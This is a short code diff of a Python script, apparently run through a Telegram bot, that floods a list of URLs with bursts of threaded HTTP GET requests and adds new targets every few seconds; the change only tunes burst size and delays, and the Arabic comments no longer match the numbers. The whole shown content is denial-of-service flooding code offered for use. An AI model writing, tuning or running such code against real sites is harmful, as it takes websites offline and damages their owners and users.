@@ -29,11 +29,11 @@ def load_urls():
 def attack_url(url):
     while is_running:
         try:
-            for _ in range(150):  # إرسال 400 طلب دفعة واحدة
+            for _ in range(100):  # إرسال 400 طلب دفعة واحدة
                 threading.Thread(target=requests.get, args=(url,), daemon=True).start()
         except:
             pass
-        time.sleep(0.05)  # تقليل الانتظار بين الدُفعات
+        time.sleep(1)  # تقليل الانتظار بين الدُفعات
 
 # بدء الإرسال تدريجياً لكل رابط
 def gradual_attack():
@@ -44,7 +44,7 @@ def gradual_attack():
         thread.start()
         active_threads.append(thread)
         url_index += 1
-        time.sleep(4)  # إضافة رابط جديد كل 8 ثواني
+        time.sleep(3)  # إضافة رابط جديد كل 8 ثواني
 
 # أمر /start في بوت تلغرام
 def start(update: Update, context: CallbackContext):
